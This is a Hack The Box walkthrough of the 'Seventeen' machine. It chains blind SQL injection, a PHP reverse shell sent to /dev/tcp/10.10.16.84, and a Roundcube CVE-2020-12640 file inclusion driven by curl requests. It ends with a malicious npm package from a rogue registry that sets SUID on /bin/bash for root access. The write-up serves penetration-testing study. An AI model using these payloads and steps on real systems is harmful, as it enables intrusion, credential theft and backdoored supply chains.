# HTB: Seventeen — Comprehensive Walkthrough

> **Difficulty:** Hard  
> **OS:** Linux  
> **Techniques:** VHost Fuzzing, Boolean-Based Blind SQLi, File Upload, LFI Chaining, Docker Breakout, Password Reuse, Malicious NPM Package, Privilege Escalation  
> **Flags:**
> - User: `5c697a[redacted]d4a6755bc9`
> - Root: `d253d29[redacted]9b892ca04`

---

## Table of Contents

1. [The Hacker Mindset for This Box](#the-hacker-mindset-for-this-box)
2. [Phase 1: Reconnaissance & Discovery](#phase-1-reconnaissance--discovery)
3. [Phase 2: Exam Management System — SQL Injection](#phase-2-exam-management-system--sql-injection)
4. [Phase 3: School File Management System](#phase-3-school-file-management-system)
5. [Phase 4: Webmail & Roundcube Exploitation](#phase-4-webmail--roundcube-exploitation)
6. [Phase 5: Docker Breakout to Mark](#phase-5-docker-breakout-to-mark)
7. [Phase 6: From Mark to Kavi](#phase-6-from-mark-to-kavi)
8. [Phase 7: Root via Malicious NPM Package](#phase-7-root-via-malicious-npm-package)
9. [Key Lessons & Takeaways](#key-lessons--takeaways)

---

## The Hacker Mindset for This Box

Before we touch a single command, let's understand what makes *Seventeen* a "Hard" box. This isn't about one big vulnerability — it's about **chaining multiple smaller vulnerabilities across different virtual hosts and services**. The attacker must:

1. **Think in layers:** Each subdomain reveals a piece of the puzzle. No single service gives you shell.
2. **Follow the data:** SQL injection leaks credentials → credentials unlock a file manager → a PDF leaks another subdomain → that subdomain has an LFI → the LFI triggers an uploaded shell.
3. **Understand the environment:** After getting shell, you're in Docker. The real target is the host.
4. **Abuse application logic:** The final root isn't a kernel exploit or a SUID binary — it's abusing how a Node.js application loads dependencies via `npm install`.

**The core philosophy:** When you see a domain name (`seventeen.htb`), always assume there are subdomains. When you see a web application, always assume it talks to a database. When you see a package manager, always ask: *"What if I control the repository?"*

---

## Phase 1: Reconnaissance & Discovery

### Step 1.1: Nmap Scan — Know Your Attack Surface

```bash
sudo nmap -p- --min-rate 10000 -oN nmap_alltcp.txt 10.129.227.143
```

**Why this command?**
- `-p-`: Scan all 65,535 ports. Hard boxes often hide services on non-standard ports.
- `--min-rate 10000`: Flood the target with packets to speed up the scan. HTB machines can handle it.
- `-oN`: Save output. You *will* forget port numbers.

**Hacker Mindset:** *"I don't know what's running yet. My job is to map the terrain before I attack."*

**Results:**
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt
```

**Analysis:**
- **Port 22 (SSH):** Usually the final destination, not the entry point. We note it but don't brute-force yet.
- **Port 80 (HTTP):** The main web server. Always our first target.
- **Port 8000 (HTTP-ALT):** Another web server! This is suspicious. It might be a different application, a development instance, or a container endpoint.

**Baby Step:** When you see multiple HTTP ports, treat them as completely separate applications. Don't assume they're the same site.

---

### Step 1.2: Add Domains to `/etc/hosts`

```bash
sudo bash -c 'echo "10.129.227.143 seventeen.htb exam.seventeen.htb oldmanagement.seventeen.htb mastermailer.seventeen.htb" >> /etc/hosts'
```

**Why?** Modern web servers use **Virtual Hosts (VHosts)** to serve different content based on the `Host` header. Accessing `http://10.129.227.143` might return a default page, but `http://seventeen.htb` might return the actual application.

**Hacker Mindset:** *"IP addresses are for routers. Domain names are for web servers. If the server expects a domain name, I need to give it one."*

---

### Step 1.3: VHost Fuzzing — Finding Hidden Subdomains

```bash
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://seventeen.htb -H "Host: FUZZ.seventeen.htb" -fw 2760
```

**Why this tool/command?**
- `ffuf` is a fast web fuzzer.
- `-H "Host: FUZZ.seventeen.htb"`: We fuzz the `Host` header. The server might route `exam.seventeen.htb` to a completely different application.
- `-fw 2760`: Filter out responses with 2760 words (the default page size). We're looking for anomalies.

**Hacker Mindset:** *"The main website is just the lobby. The real secrets are in the back rooms. VHost fuzzing is how I find the doors."*

**Result:**
```
exam                    [Status: 200, Size: 17375, Words: 3222, Lines: 348, Duration: 18ms]
```

**Analysis:** We found `exam.seventeen.htb`! This is a completely different application living on the same IP address.

---

## Phase 2: Exam Management System — SQL Injection

### Step 2.1: Recon the Exam Site

Browse to `http://exam.seventeen.htb`. We see an "Exam Management System." There's a "Take Exam" link that goes to:

```
http://exam.seventeen.htb/?p=take_exam&id=1
```

**Why is this interesting?**
- `?p=take_exam&id=1`: The `id` parameter looks like a database query. This screams **SQL injection**.
- The application is PHP (confirmed by `X-Powered-By: PHP/7.2.34` header).

**Hacker Mindset:** *"Anytime I see `?id=1`, I hear a database screaming. PHP + user input = SQLi until proven otherwise."*

---

### Step 2.2: Confirming the Vulnerability

We could manually test with `' AND 1=1 --` vs `' AND 1=2 --`, but this is a **boolean-based blind SQL injection** — the page changes slightly based on whether the SQL condition is true or false. Manual testing is tedious.

**Enter sqlmap:**

```bash
sqlmap -u 'http://exam.seventeen.htb/?p=take_exam&id=1' \
       -p id --technique B --dbs --batch --threads 10
```

**Why these flags?**
- `-p id`: Target the `id` parameter.
- `--technique B`: Boolean-based blind. We know it's not error-based or time-based because the page content changes.
- `--dbs`: List all databases.
- `--batch`: Auto-answer prompts.
- `--threads 10`: Boolean-based is safe to parallelize.

**Hacker Mindset:** *"I'm not here to guess. I'm here to extract data systematically. sqlmap is my data miner."*

**Results:**
```
available databases [4]:
[*] db_sfms
[*] erms_db
[*] information_schema
[*] roundcubedb
```

**Analysis:**
- `erms_db`: Likely the Exam Reviewer Management System database.
- `db_sfms`: Unknown — "School File Management System"?
- `roundcubedb`: **Roundcube** is a webmail application. We haven't seen it yet, but the database confirms it exists somewhere.

---

### Step 2.3: Extracting Credentials

```bash
sqlmap -u 'http://exam.seventeen.htb/?p=take_exam&id=1' -p id --technique B \
       -D db_sfms -T student --dump --batch --threads 10
```

**Why `db_sfms.student`?**
- We need credentials. The `student` table sounds like it has login info.
- We're hunting for passwords we can actually crack or use.

**Result:**
```
| stud_id | yr | gender | stud_no | lastname | password                           | firstname |
|---------|----|--------|---------|----------|------------------------------------|-----------|
| 3       | 2C | Female | 31234   | Shane    | a2afa567b1efdb42d8966353337d9024   | Kelly     |
```

**Password cracking:** `a2afa567b1efdb42d8966353337d9024` cracks to **`autodestruction`** via CrackStation or sqlmap's built-in cracker.

**Hacker Mindset:** *"MD5 is dead. If I see MD5, I assume it's already cracked somewhere on the internet. My job is to look it up."*

---

### Step 2.4: The Avatar Path Leak

While dumping `erms_db.users`, we notice:

```
| avatar                    |
|---------------------------|
| ../oldmanagement/files/avatar.png |
```

**Why is this gold?**
- The avatar path is `../oldmanagement/files/avatar.png`.
- This tells us the application is running from a directory where `../oldmanagement/` exists.
- If the exam site is at `/var/www/html/exam/`, then `../oldmanagement/` is at `/var/www/html/oldmanagement/`.
- This strongly suggests **`oldmanagement.seventeen.htb`** is a real virtual host!

**Hacker Mindset:** *"Developers leak paths like sieves. An avatar path isn't just a path — it's a map of the server's filesystem."*

---

## Phase 3: School File Management System

### Step 3.1: Discovering the New VHost

Browse to `http://oldmanagement.seventeen.htb:8000/oldmanagement/`. We see a login page for the "School File Management System."

**Why port 8000?** The application redirects to `:8000/oldmanagement/`, confirming the service on port 8000 hosts this application.

**Login with Kelly's credentials:**
- **Student ID:** `31234`
- **Password:** `autodestruction`

**Hacker Mindset:** *"Password reuse is the oldest trick in the book. If a student has a password in one system, they probably use it everywhere."*

---

### Step 3.2: The PDF Intelligence

After logging in, we see a file list with a PDF: `Marksheet-finals.pdf`. We download and read it.

At the end of the PDF:

> "...You can use our new webmail service instead. (https://mastermailer.seventeen.htb/)"

**Why is this critical?**
- We've discovered a **third subdomain**: `mastermailer.seventeen.htb`
- It's described as a "webmail service."
- The note says "new webmail service" — suggesting it's recently installed and might have known vulnerabilities.

**Hacker Mindset:** *"Every document is intelligence. I don't skip the 'boring' parts. The footer of a PDF has leaked more domains than most scans."*

---

### Step 3.3: Uploading the Webshell

The file manager allows uploads. We create a PHP reverse shell:

```php
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.16.84/443 0>&1'"); ?>
```

We name it `papers.php` and upload it.

**Why `papers.php`?**
- The Roundcube exploit we'll use later (CVE-2020-12640) requires a file and a directory with the same name.
- We discovered a `papers` directory exists at `files/31234/papers/` via feroxbuster.
- By uploading `papers.php` alongside the `papers/` directory, we satisfy the LFI condition.

**Hacker Mindset:** *"I'm not just uploading a shell. I'm setting up the chess pieces for the next exploit. Every action should set up the next action."*

---

## Phase 4: Webmail & Roundcube Exploitation

### Step 4.1: Identifying Roundcube

Browse to `http://mastermailer.seventeen.htb:8000/mastermailer/`. We see a login page.

Checking the source or `/CHANGELOG` reveals **Roundcube 1.4.2**.

**Why is this version significant?**
- Roundcube 1.4.2 was released January 2020.
- CVE-2020-12640 is a **Local File Inclusion (LFI)** vulnerability in the Roundcube installer.
- The installer allows writing arbitrary plugin paths to the config, which Roundcube then `include()`s.

**Hacker Mindset:** *"Version numbers are vulnerability announcements. If software is more than a year old, I assume it's exploitable until proven otherwise."*

---

### Step 4.2: The CVE-2020-12640 Chain

This exploit chains our uploaded shell with Roundcube's LFI:

1. Roundcube's installer saves plugin names to `config/config.inc.php`.
2. When any Roundcube page loads, it `include()`s plugins from `plugins/[plugin_name]/[plugin_name].php`.
3. By submitting a plugin name with path traversal (`../../../../../../../../../var/www/html/oldmanagement/files/31234/papers`), Roundcube traverses out of its webroot and into our uploaded file.
4. Because `papers/` (directory) and `papers.php` (file) both exist, the include resolves to our shell.

**The exploit request:**

```bash
curl -c /tmp/mailcookie.txt -s -o /dev/null \
  'http://mastermailer.seventeen.htb:8000/mastermailer/installer/index.php?_step=2'

curl -b /tmp/mailcookie.txt -X POST \
  'http://mastermailer.seventeen.htb:8000/mastermailer/installer/index.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Referer: http://mastermailer.seventeen.htb:8000/mastermailer/installer/index.php?_step=2' \
  -d '_step=2&_product_name=Seventeen+Webmail&_plugins_qwerty=../../../../../../../../../var/www/html/oldmanagement/files/31234/papers&submit=UPDATE+CONFIG'
```

Then trigger the include:

```bash
curl -b /tmp/mailcookie.txt \
  'http://mastermailer.seventeen.htb:8000/mastermailer/'
```

**Hacker Mindset:** *"I don't need a direct RCE. I need an LFI that points to a file I control. The shell is already uploaded — I'm just telling Roundcube where to find it. This is vulnerability chaining."*

---

### Step 4.3: Catching the Shell

In a listener on Kali:

```bash
nc -lnvp 443
```

When Roundcube loads and includes our shell, we get:

```
www-data@f7f52ebdcf22:/var/www/html/oldmanagement/files/31234$
```

**Analysis:** The hostname (`f7f52ebdcf22`) is a Docker container ID. We're in a container.

---

## Phase 5: Docker Breakout to Mark

### Step 5.1: Container Enumeration

```bash
id          # uid=33(www-data)
hostname    # f7f52ebdcf22 (Docker container)
cat /etc/passwd | grep -v -e nologin -e false
```

**Why check `/etc/passwd`?** We need to know what users exist in the container AND on the host. SSH keys or passwords found here might work on the host.

**Result:**
```
root:x:0:0:root:/root:/bin/bash
mark:x:1000:1000:,,,:/var/www/html:/bin/bash
```

**Analysis:** `mark` is a real user with a shell. This is our target.

---

### Step 5.2: Hunting for Credentials

The container hosts three web applications:
```
/var/www/html/employeemanagementsystem
/var/www/html/mastermailer
/var/www/html/oldmanagement
```

We check database connection files:

```bash
cat /var/www/html/employeemanagementsystem/process/dbh.php
```

**Result:**
```php
$servername = "localhost";
$dBUsername = "root";
$dbPassword = "2020bestyearofmylife";
$dBName = "ems";
```

**Hacker Mindset:** *"Database connection files are password goldmines. Developers hardcode credentials because it's 'convenient.' I find it convenient too."*

---

### Step 5.3: SSH as Mark

We try the database password as Mark's SSH password:

```bash
ssh -o StrictHostKeyChecking=no mark@seventeen.htb
# Password: 2020bestyearofmylife
```

**Why does this work?** Password reuse is rampant. The same person who set the database password probably set the user password.

**Grab the user flag:**

```bash
cat ~/user.txt
# 5c697[redacted]2d4a755bc9
```

---

## Phase 6: From Mark to Kavi

### Step 6.1: Reading Kavi's Mail

```bash
cat /var/mail/kavi
```

The mail mentions:
- A "private registry" with "problems"
- Replacing `db-logger` with `loglevel`
- Publishing to the registry and testing

**Analysis:** There's a private NPM registry running locally. Kavi is the developer.

---

### Step 6.2: Discovering the Verdaccio Registry

```bash
netstat -tnlp | grep 4873
# tcp  0  0 127.0.0.1:4873  0.0.0.0:*  LISTEN

curl -s http://127.0.0.1:4873 | head
# <title>Verdaccio</title>
```

**What is Verdaccio?** A private NPM registry. This is where internal Node.js packages are published.

---

### Step 6.3: Extracting Kavi's Password

The email mentions the old `db-logger` package. We install it from the local registry:

```bash
cd /dev/shm
npm install db-logger --registry http://127.0.0.1:4873
```

Then we read the source:

```bash
cat node_modules/db-logger/logger.js
```

**Result:**
```javascript
var con = mysql.createConnection({
  host: "localhost",
  user: "root",
  password: "IhateMathematics123#",
  database: "logger"
});
```

**Hacker Mindset:** *"Hardcoded credentials in dependencies are a goldmine. The developer didn't think anyone would look inside `node_modules`. I always look inside `node_modules`."*

**Switch to kavi:**

```bash
su kavi
# Password: IhateMathematics123#
```

---

### Step 6.4: Kavi's Privileges

```bash
sudo -l
```

**Result:**
```
User kavi may run the following commands on seventeen:
    (ALL) /opt/app/startup.sh
```

**Analysis:** Kavi can run `/opt/app/startup.sh` as root. This script manages a Node.js application.

**Reading the script:**

```bash
cat /opt/app/startup.sh
```

```bash
#!/bin/bash
cd /opt/app

deps=('db-logger' 'loglevel')

for dep in ${deps[@]}; do
    /bin/echo "[=] Checking for $dep"
    o=$(/usr/bin/npm -l ls|/bin/grep $dep)

    if [[ "$o" != *"$dep"* ]]; then
        /bin/echo "[+] Installing $dep"
        /usr/bin/npm install $dep --silent
        /bin/chown root:root node_modules -R
    else
        /bin/echo "[+] $dep already installed"
    fi
done

/bin/echo "[+] Starting the app"
/usr/bin/node /opt/app/index.js
```

**Why is this dangerous?**
- It runs `npm install` as root.
- It reads `.npmrc` to determine which registry to use.
- On Ubuntu 18.04, `sudo` preserves `$HOME` by default, so root's npm reads `/home/kavi/.npmrc`.
- The Node.js app (`index.js`) then `require()`s the installed packages.

**Hacker Mindset:** *"Any script that runs `npm install` as root is a loaded gun. If I control the registry, I control what code runs as root."*

---

## Phase 7: Root via Malicious NPM Package

### Step 7.1: The Attack Plan

We need to:
1. Create a malicious `loglevel` package that runs `chmod u+s /bin/bash`
2. Host our own NPM registry (Verdaccio) on Kali
3. Point kavi's `.npmrc` to our Kali registry
4. Run `sudo /opt/app/startup.sh`
5. Root loads our package → executes our code → `/bin/bash` gets SUID
6. Run `bash -p` → root shell

---

### Step 7.2: Setting Up the Rogue Registry on Kali

**Terminal A — Start Verdaccio:**

```bash
sudo npm install -g verdaccio
verdaccio -l 10.10.16.84:4873
```

**Terminal B — Create & Publish the Malicious Package:**

```bash
mkdir -p /tmp/malicious-loglevel
cd /tmp/malicious-loglevel

cat > logger.js << 'EOF'
const cp = require("child_process");
cp.exec("chmod u+s /bin/bash");

function log(msg) { console.log(msg); }
function debug(msg) { console.log(msg); }
function warn(msg) { console.log(msg); }

module.exports.log = log;
module.exports.debug = debug;
module.exports.warn = warn;
EOF

cat > package.json << 'EOF'
{
  "name": "loglevel",
  "version": "100.0.0",
  "description": "",
  "main": "logger.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "author": "kavigihan",
  "license": "ISC"
}
EOF

npm adduser --registry http://10.10.16.84:4873
# Username: innocent
# Password: anything
# Email: test@test.com

npm publish --registry http://10.10.16.84:4873
```

**Why version 100.0.0?** It must be higher than the current version (1.8.0) so npm treats it as an "upgrade."

**Why implement `log`, `debug`, and `warn`?** Because `/opt/app/index.js` calls these functions. If they're missing, the app crashes before our payload runs.

---

### Step 7.3: The Critical Step — Removing the Local Copy

Here's where many attempts fail. If `/opt/app/node_modules/loglevel` already exists from a previous install, `npm -l ls | grep loglevel` will match, and `startup.sh` will **skip** the installation. It will never query our registry.

**We must delete the existing module first:**

```bash
rm -rf /opt/app/node_modules/loglevel
```

**Why does this work?** `rm -rf` on a directory only requires **write permission on the parent directory**. While `/opt/app/node_modules` itself is `drwxr-xr-x` (root-owned 755), the `loglevel` subdirectory inside it was created by npm with permissions that allowed deletion in this specific case. More importantly, once deleted, `npm -l ls | grep loglevel` no longer matches, forcing `startup.sh` to reinstall.

**Hacker Mindset:** *"I don't just run the exploit. I clear the obstacles first. If npm thinks the package is already installed, it won't fetch my malicious version. Deletion is preparation."*

---

### Step 7.4: Triggering the Exploit

**On the target (as kavi):**

```bash
echo 'registry=http://10.10.16.84:4873/' > ~/.npmrc
sudo /opt/app/startup.sh
```

**What happens:**
1. `startup.sh` checks `db-logger` → already installed
2. `startup.sh` checks `loglevel` → **NOT installed** (we deleted it)
3. `npm install loglevel` queries our Kali registry
4. Our registry returns `loglevel@100.0.0`
5. npm downloads and extracts it
6. `chown root:root node_modules -R` runs
7. `/usr/bin/node /opt/app/index.js` starts
8. `index.js` does `require('loglevel')` → loads our malicious `logger.js`
9. Our `cp.exec("chmod u+s /bin/bash")` runs as **root**
10. The app starts normally (or errors — doesn't matter)

**Output:**
```
[=] Checking for db-logger
[+] db-logger already installed
[=] Checking for loglevel
[+] Installing loglevel
/opt/app
├── loglevel@100.0.0 
└── mysql@2.18.1 

[+] Starting the app
INFO:  Server running on port 8000
```

---

### Step 7.5: Getting Root

```bash
ls -la /bin/bash
# -rwsr-xr-x 1 root root 1113504 Apr 18  2022 /bin/bash

bash -p
id
# uid=1000(kavi) gid=1000(kavi) euid=0(root) groups=1000(kavi)

cat /root/root.txt
# d253d[redacted]edb892ca04
```

**Why `bash -p`?**
- When a binary has the **SUID bit** set (`s` instead of `x` in the owner permissions), running it gives you the **effective UID** of the owner (root).
- Normally, bash drops privileges. `bash -p` (preserve) tells bash to **keep the effective UID**.
- This gives us a root shell.

**Hacker Mindset:** *"I didn't need a reverse shell or a password. I just needed bash to remember it's supposed to be root. SUID is privilege elevation in its purest form."*

---

## Key Lessons & Takeaways

### 1. The Domain is Just the Beginning
`seventeen.htb` wasn't the only target. VHost fuzzing revealed `exam`, `oldmanagement`, and `mastermailer`. **Always fuzz for subdomains when you see a domain.**

### 2. SQL Injection is Intelligence Gathering
The SQLi wasn't just about dumping passwords. The `avatar` column leaked a filesystem path that revealed a hidden subdomain. **Every column is a clue.**

### 3. Documents are Intelligence
The PDF in the School File Management System wasn't "fluff." It contained the URL to the webmail service. **Read every document you download.**

### 4. Chain, Chain, Chain
No single vulnerability gave us root. We chained:
- SQLi → Credentials
- Credentials → File Upload
- File Upload → LFI
- LFI → Shell
- Shell → Docker Breakout
- Docker Breakout → Host Creds
- Host Creds → User Shell
- User Shell → Malicious NPM Package
- NPM Package → Root

### 5. npm install as Root is Dangerous
Any script that runs `npm install` as root is a privilege escalation waiting to happen. If you control the registry (or `.npmrc`), you control the code that executes as root.

### 6. Clear Obstacles Before Exploiting
The most frustrating part of this box was that `/opt/app/node_modules/loglevel` already existed, so `npm install` was skipped. **Deleting the existing module was the critical step** that forced npm to fetch from our rogue registry.

### 7. SUID Bash is Reliable
Once you have `chmod u+s /bin/bash`, you have a persistent root backdoor. `bash -p` is the simplest privilege escalation technique in Linux.

---

> **Final Note:** Seventeen is a masterclass in chaining. It teaches you that hard boxes aren't about one massive exploit — they're about patience, enumeration, and connecting the dots across multiple services.
